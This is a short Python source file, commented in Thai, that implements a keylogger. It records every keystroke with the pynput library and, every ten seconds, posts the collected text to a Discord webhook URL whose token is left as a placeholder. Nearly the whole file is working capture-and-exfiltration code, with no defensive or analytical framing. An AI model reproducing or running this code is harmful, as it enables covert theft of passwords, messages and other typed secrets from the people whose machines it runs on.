# นำเข้าไลบรารีที่จำเป็น
from pynput import keyboard
import requests
import json
import threading

# ตัวแปร global สำหรับเก็บข้อความจากการกดแป้นพิมพ์
text = ""

# ตัวแปรสำหรับเปิด/ปิดการส่งข้อความไปยัง Discord
send_to_discord = True  # True = เปิดการส่ง, False = ปิดการส่ง

# ตัวแปรสำหรับ Discord Webhook token
webhook_token = "<your_webhook_token>"

# URL Webhook ของ Discord โดยไม่ต้องกำหนด webhook_id
webhook_url = f"https://discord.com/api/webhooks/{webhook_token}"

# กำหนดช่วงเวลาการทำงาน (หน่วย: วินาที)
time_interval = 10

# ฟังก์ชันสำหรับส่งข้อความไปยัง Discord Webhook
def send_post_req():
    global text
    try:
        if send_to_discord:  # ตรวจสอบว่าการส่งเปิดอยู่หรือไม่
            # ข้อความที่ต้องการส่ง
            payload = {
                "content": f"ข้อความที่บันทึก:\n{text}"
            }
            # ส่งคำร้องขอ POST ไปยัง Discord Webhook
            r = requests.post(webhook_url, json=payload)
            if r.status_code == 204:
                print("ส่งข้อความไปยัง Discord สำเร็จ")
            else:
                print("เกิดข้อผิดพลาดในการส่งข้อความไปยัง Discord")

        # ตั้ง Timer ให้ส่งซ้ำทุก <time_interval> วินาที
        timer = threading.Timer(time_interval, send_post_req)
        timer.start()

        # รีเซ็ตข้อความหลังส่งเสร็จ
        text = ""
    except Exception as e:
        print(f"ไม่สามารถส่งคำร้องขอได้: {e}")

# ฟังก์ชันที่ถูกเรียกใช้เมื่อมีการกดแป้นพิมพ์
def on_press(key):
    global text

    # จัดการการกดปุ่มต่าง ๆ และเพิ่มข้อความในตัวแปร text
    if key == keyboard.Key.enter:
        text += "\n"  # เพิ่มบรรทัดใหม่
    elif key == keyboard.Key.tab:
        text += "\t"  # เพิ่มแท็บ
    elif key == keyboard.Key.space:
        text += " "  # เพิ่มช่องว่าง
    elif key == keyboard.Key.shift:
        pass  # ไม่ทำอะไรเมื่อกด Shift
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass  # ไม่ทำอะไรเมื่อกด Backspace แต่ไม่มีข้อความ
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]  # ลบตัวอักษรตัวสุดท้ายใน text
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass  # ไม่ทำอะไรเมื่อกด Ctrl
    elif key == keyboard.Key.esc:
        return False  # หยุดการฟังเมื่อกด Escape
    else:
        # แปลง key เป็น string และเพิ่มเข้าไปใน text
        text += str(key).strip("'")

# ตัวฟังการกดแป้นพิมพ์ (keyboard listener) ทำงานใน Thread
with keyboard.Listener(on_press=on_press) as listener:
    # เริ่มต้นส่งข้อความไปยัง Discord
    send_post_req()
    listener.join()